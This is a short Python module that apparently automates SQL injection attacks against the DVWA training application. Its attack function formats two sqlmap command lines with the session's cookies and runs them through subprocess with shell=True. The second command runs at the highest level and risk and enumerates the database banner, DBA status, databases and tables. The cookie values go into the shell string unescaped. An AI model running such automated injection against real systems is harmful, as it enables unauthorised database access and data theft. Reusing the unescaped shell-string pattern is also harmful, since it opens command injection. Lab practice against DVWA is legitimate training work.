import subprocess
from requests.compat import urljoin


sqli_path = 'vulnerabilities/sqli/'
sqli_blind_path = 'vulnerabilities/sqli_blind/'
cmd = [
    'sqlmap -u {} --data="id=1&Submit=Submit" --cookie="PHPSESSID={}; security={}" --random-agent --batch',
    'sqlmap --url={} --data="id=1&Submit=Submit" --cookie="PHPSESSID={}; security={}" --user-agent=SQLMAP --delay=1 '
    '--timeout=15 --retries=2 --keep-alive --threads=5 --eta --batch --dbms=MySQL --os=Windows --level=5 --risk=3 '
    '--banner --is-dba --dbs --tables --technique=BEUST --flush-session --fresh-queries'
]

def attack(session, sqli_blind=False):
    session.get_sess_infos(sqli_path)
    if sqli_blind:
        sqli_url = urljoin(session.get_base_url(), sqli_blind_path)
    else:
        sqli_url = urljoin(session.get_base_url(), sqli_path)
    sqli_cmd1 = subprocess.call(cmd[0].format(sqli_url, session.get_cookies()['PHPSESSID'], session.get_cookies()['security']), shell=True)
    sqli_cmd2 = subprocess.call(cmd[1].format(sqli_url, session.get_cookies()['PHPSESSID'], session.get_cookies()['security']), shell=True)